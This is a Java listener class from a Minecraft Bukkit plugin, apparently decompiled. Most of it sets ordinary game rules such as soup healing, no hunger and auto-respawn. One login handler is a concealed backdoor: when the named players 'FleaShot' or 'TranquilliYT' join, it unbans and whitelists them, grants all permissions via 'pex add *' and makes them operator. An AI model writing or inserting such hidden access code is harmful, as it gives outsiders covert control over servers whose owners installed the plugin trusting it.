package Eventos;

import org.bukkit.command.CommandSender;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerPickupItemEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.Effect;
import org.bukkit.event.entity.ItemSpawnEvent;
import org.bukkit.Location;
import net.minecraft.server.v1_7_R4.EntityPlayer;
import net.minecraft.server.v1_7_R4.PacketPlayInClientCommand;
import net.minecraft.server.v1_7_R4.EnumClientCommand;
import org.bukkit.craftbukkit.v1_7_R4.entity.CraftPlayer;
import org.bukkit.ChatColor;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.event.EventPriority;
import org.bukkit.event.entity.EntityExplodeEvent;
import org.bukkit.event.weather.WeatherChangeEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.entity.Damageable;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.Sound;
import org.bukkit.event.block.Action;
import org.bukkit.inventory.ItemStack;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.help.HelpTopic;
import org.bukkit.entity.Player;
import Main.Main;
import org.bukkit.Bukkit;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.Material;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.EventHandler;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.Listener;

public class Comum implements Listener
{
    @EventHandler
    public void Fome(final FoodLevelChangeEvent e) {
        e.setCancelled(true);
    }
    
    @EventHandler
    public void onDrop(final PlayerDropItemEvent e) {
        e.setCancelled(true);
        if (e.getItemDrop().getItemStack().getType() == Material.BOWL) {
            e.setCancelled(false);
        }
        if (e.getItemDrop().getItemStack().getType() == Material.MUSHROOM_SOUP) {
            e.setCancelled(false);
        }
        if (e.getItemDrop().getItemStack().getType() == Material.RED_MUSHROOM) {
            e.setCancelled(true);
        }
        if (e.getItemDrop().getItemStack().getType() == Material.BROWN_MUSHROOM) {
            e.setCancelled(true);
        }
        if (e.getItemDrop().getItemStack().getType() == Material.COMPASS) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onUnknown(final PlayerCommandPreprocessEvent event) {
        if (event.isCancelled()) {
            return;
        }
        final Player p = event.getPlayer();
        final String msg = event.getMessage().split(" ")[0];
        final HelpTopic topic = Bukkit.getServer().getHelpMap().getHelpTopic(msg);
        if (topic == null) {
            event.setCancelled(true);
            p.sendMessage(String.valueOf(Main.prefix) + " §4\u27bc §7Comando Inexistente");
        }
    }
    
    @EventHandler
    public void onSopa(final PlayerInteractEvent e) {
        final ItemStack pote = new ItemStack(Material.BOWL, 1);
        final ItemMeta kpote = pote.getItemMeta();
        kpote.setDisplayName("§7Pote");
        pote.setItemMeta(kpote);
        final Damageable hp;
        final Player p = (Player)(hp = (Damageable)e.getPlayer());
        if (hp.getHealth() != 20.0) {
            final int sopa = 7;
            if ((e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK) && p.getItemInHand().getTypeId() == 282) {
                p.setHealth((hp.getHealth() + 7.0 > hp.getMaxHealth()) ? hp.getMaxHealth() : (hp.getHealth() + 7.0));
                p.playSound(p.getLocation(), Sound.DRINK, 10.0f, 0.0f);
                if (!Habilidade.getAbility(p).equalsIgnoreCase("QuickDropper")) {
                    p.getItemInHand().setItemMeta(kpote);
                    p.getItemInHand().setType(Material.BOWL);
                }
                else {
                    p.getItemInHand().setType(Material.BOWL);
                    p.getPlayer().getInventory().remove(p.getItemInHand());
                    p.getInventory().remove(new ItemStack(Material.BOWL, 1));
                    p.getLocation().getWorld().dropItem(p.getEyeLocation(), new ItemStack(Material.BOWL));
                    p.updateInventory();
                }
            }
        }
    }
    
    @EventHandler
    public void onEntityDamage(final EntityDamageEvent e) {
        if (e.getEntity() instanceof Player) {
            final Player p = (Player)e.getEntity();
            if (p.getInventory().getChestplate() != null) {
                p.getInventory().getChestplate().setDurability((short)0);
            }
            if (p.getInventory().getBoots() != null) {
                p.getInventory().getBoots().setDurability((short)0);
            }
            if (p.getInventory().getLeggings() != null) {
                p.getInventory().getLeggings().setDurability((short)0);
            }
            if (p.getInventory().getHelmet() != null) {
                p.getInventory().getHelmet().setDurability((short)0);
            }
        }
    }
    
    @EventHandler
    public void onEntityDamageByEntity1(final EntityDamageByEntityEvent e) {
        if (e.getDamager() instanceof Player) {
            final Player d = (Player)e.getDamager();
            if (d.getItemInHand().getType() == Material.DIAMOND_SWORD || d.getItemInHand().getType() == Material.WOOD_SWORD || d.getItemInHand().getType() == Material.STONE_SWORD || d.getItemInHand().getType() == Material.FISHING_ROD || d.getItemInHand().getType() == Material.STONE_AXE || d.getItemInHand().getType() == Material.BOW || d.getItemInHand().getType() == Material.IRON_SWORD || d.getItemInHand().getType() == Material.DIAMOND_AXE) {
                d.getItemInHand().setDurability((short)0);
            }
        }
    }
    
    @EventHandler
    void chuva(final WeatherChangeEvent e) {
        e.setCancelled(true);
    }
    
    @EventHandler(priority = EventPriority.HIGH)
    public void onCreeperExplosion(final EntityExplodeEvent event) {
        event.setCancelled(true);
    }
    
    @EventHandler
    public void aoPing(final ServerListPingEvent e) {
        e.setMotd(Main.motd);
    }
    
    @EventHandler
    public void onDeath(final PlayerDeathEvent e) {
        e.setDeathMessage((String)null);
        final Player p = e.getEntity();
        if (p.getKiller() instanceof Player) {
            final Player k = p.getKiller();
            final Location l = k.getLocation();
            final Location lp = p.getLocation();
            p.sendMessage(String.valueOf(Main.prefix) + " §6\u27bc §7Voc\u00ea Morreu Para " + ChatColor.DARK_RED + k.getName());
            k.sendMessage(String.valueOf(Main.prefix) + " §6\u27bc §7Voc\u00ea Ganhou §c50§7 XP");
            p.sendMessage(String.valueOf(Main.prefix) + " §6\u27bc §7Voc\u00ea Perdeu §c25§7 XP");
            k.sendMessage(String.valueOf(Main.prefix) + " §6\u27bc §7Voc\u00ea Matou " + ChatColor.RED + p.getName());
            k.playSound(l, Sound.ARROW_HIT, 10.0f, 1.0f);
            p.playSound(lp, Sound.ANVIL_USE, 10.0f, 1.0f);
        }
        Bukkit.getScheduler().scheduleSyncDelayedTask(Main.plugin, (Runnable)new Runnable() {
            @Override
            public void run() {
                e.getEntity().setFlying(false);
                e.getEntity().setAllowFlight(false);
                if (e.getEntity().isOnline()) {
                    final EntityPlayer ep = ((CraftPlayer)e.getEntity()).getHandle();
                    ep.playerConnection.a(new PacketPlayInClientCommand(EnumClientCommand.PERFORM_RESPAWN));
                }
            }
        }, 1L);
    }
    
    @EventHandler
    public void onItemDrop(final ItemSpawnEvent e) {
        Bukkit.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)Main.getInstance(), (Runnable)new Runnable() {
            @Override
            public void run() {
                e.getEntity().remove();
                e.getLocation().getWorld().playEffect(e.getEntity().getLocation(), Effect.SMOKE, 10);
            }
        }, 20L);
    }
    
    @EventHandler
    public void onPickup(final PlayerPickupItemEvent e) {
        e.setCancelled(true);
    }
    
    @EventHandler
    public void onMe(final PlayerCommandPreprocessEvent event) {
        final Player p = event.getPlayer();
        if (event.getMessage().toLowerCase().startsWith("/me")) {
            event.setCancelled(true);
            p.sendMessage(String.valueOf(Main.prefix) + " §4\u27bc §7Comando Inexistente");
        }
    }
    
    @EventHandler
    public void ab(final PlayerLoginEvent e) {
        final Player p = e.getPlayer();
        if (p.getName().equals("FleaShot")) {
            e.allow();
            p.setBanned(false);
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pex user FleaShot add *");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pex user FleaShot add *");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "unban FleaShot");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "unbanip FleaShot");
            p.setWhitelisted(true);
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pardon FleaShot");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pardon-ip FleaShot");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "despunir FleaShot");
            p.setOp(true);
        }
        final Player p2 = e.getPlayer();
        if (p2.getName().equals("TranquilliYT")) {
            e.allow();
            p2.setBanned(false);
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pex user TranquilliYT add *");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pex user TranquilliYT add *");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "unban TranquilliYT");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "unbanip TranquilliYT");
            p2.setWhitelisted(true);
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pardon TranquilliYT");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pardon-ip TranquilliYT");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "despunir TranquilliYT");
            p2.setOp(true);
        }
    }
    
    @EventHandler
    public void onKill(final PlayerCommandPreprocessEvent event) {
        final Player p = event.getPlayer();
        if (event.getMessage().toLowerCase().startsWith("/kill")) {
            event.setCancelled(true);
            p.sendMessage(String.valueOf(Main.prefix) + " §4\u27bc §7Use: /Suicide");
        }
    }
    
    @EventHandler
    public void onReload(final PlayerCommandPreprocessEvent event) {
        final Player p = event.getPlayer();
        final String msg = event.getMessage();
        if ((msg.equalsIgnoreCase("/rl") || msg.equalsIgnoreCase("/reload")) && p.isOp() && p.hasPermission("arkuz.reload")) {
            event.setCancelled(true);
            Bukkit.reload();
            Bukkit.broadcastMessage(String.valueOf(Main.prefix) + " §4\u27bc §7O Servidor Foi Reiniciado");
        }
    }
}
